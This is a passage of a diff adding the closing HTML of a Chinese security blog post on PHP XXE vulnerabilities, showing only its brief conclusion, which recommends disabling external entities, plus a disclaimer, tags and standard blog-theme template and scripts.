+<hr>
+<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p>PHP XXE 漏洞利用展示了 XML 解析器在处理外部实体时的安全风险。通过构造恶意 XML 载荷，攻击者可轻松读取服务器敏感文件或发起 SSRF 攻击。开发者和安全从业者应重视 XML 解析的配置安全，采取禁用外部实体、输入验证等措施，降低漏洞风险。</p>
+<blockquote>
+<p><strong>免责声明</strong>: 本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
+      
+        <a href="/tags/XXE/" class="print-no-link">#XXE</a>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="print-no-link">#漏洞复现</a>
+      
+        <a href="/tags/PHP/" class="print-no-link">#PHP</a>
+      
+        <a href="/tags/SSRF/" class="print-no-link">#SSRF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PHP XXE 漏洞利用与原理</div>
+      <div>https://bae-ace.github.io/2025/07/29/PHP-XXE-漏洞利用与原理/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>bae</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/01/Apache-Solr-CVE-2017-12629-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub%EF%BC%89/" title="Apache Solr CVE-2017-12629 XXE 漏洞复现与利用（基于 Vulhub）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Apache Solr CVE-2017-12629 XXE 漏洞复现与利用（基于 Vulhub）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/" title="ThinkPHP 2.x &amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）">
+                        <span class="hidden-mobile">ThinkPHP 2.x &amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"CHbSLmwKFof8sHkOvlnoDfza-MdYXbMMI","appKey":"lVqIfnWUAiZZLIag2RoSpxoo","serverURLs":"https://chbslmwk.api.lncldglobal.com","placeholder":"留言仅限讨论，禁止广告等行为","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://bae-ace.github.io" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://bae-ace.github.io/" target="_blank" rel="nofollow noopener"><span>bae</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiaoxingxing.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiaoxuehua.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
